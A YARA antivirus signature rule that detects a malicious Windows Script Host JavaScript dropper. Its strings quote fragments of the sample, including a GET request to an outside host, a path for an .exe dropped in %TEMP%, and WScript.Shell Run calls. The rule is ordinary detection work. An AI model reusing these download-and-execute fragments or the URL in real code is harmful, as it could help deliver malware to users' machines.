rule sig_20160329_e63438cff3080a4f942a07b79e886cfa {
  meta:
    description = "datamaliciousorder - file 20160329_e63438cff3080a4f942a07b79e886cfa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0bd5a9f6f04b5f496b3d206235a982617d7b53f733531ac5a07e05975fe0e5c3"

  strings:
    $s1  = "function Bbnkbricda() {return Lnyrnzfuzd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"jQEeiOzSyUihAOwP.exe\";};" fullword ascii
    $s2  = "Xmgokbkubn[Wthooul](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Tlrjnilc](Hlidckx() * 11)} while (Xmgokbkubn[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Lwanj(Xwabmzgm, Rlyljef){return Xwabmzgm - Rlyljef;};" fullword ascii
    $s5  = "var Lnyrnzfuzd = function Vllnrtfwgp() {return WScript[Vkltejs](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nfnrxhyqt(Tlkohuoxq){Lnyrnzfuzd[\"Run\"](Tlkohuoxq, Ettlsi, Ettlsi);};" fullword ascii
    $s7  = "function Xlclhmoe() {return ((Evwpu == true) && (Evwpu == Fwngghvhs)) ? 1 : Ettlsi;};" fullword ascii
    $s8  = "function Kstnatem()" fullword ascii
    $s9  = "var Evwpu = false;" fullword ascii
    $s10 = "var Gvwaujvob = false;" fullword ascii
    $s11 = "var Xoesofgf = new this[\"Date\"]();" fullword ascii
    $s12 = " while (Uvixbgg){" fullword ascii
    $s13 = "function Hlidckx(){return 22;};" fullword ascii
    $s14 = "Evwpu = true; " fullword ascii
    $s15 = "function Qdoegwl(){return Vkltejs;};" fullword ascii
    $s16 = "var Fwngghvhs = false;" fullword ascii
    $s17 = "return Lwanj(Xmzpdoval, Mtyduh);" fullword ascii
    $s18 = "function Fblyxczi(){return Eviufpi;};" fullword ascii
    $s19 = "Fwngghvhs = true; " fullword ascii
    $s20 = "function Sfvfmzfxj(Lkxwlowc) {var Jsrvh = (1, 2, 3, 4, 5, Lkxwlowc); return Jsrvh;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}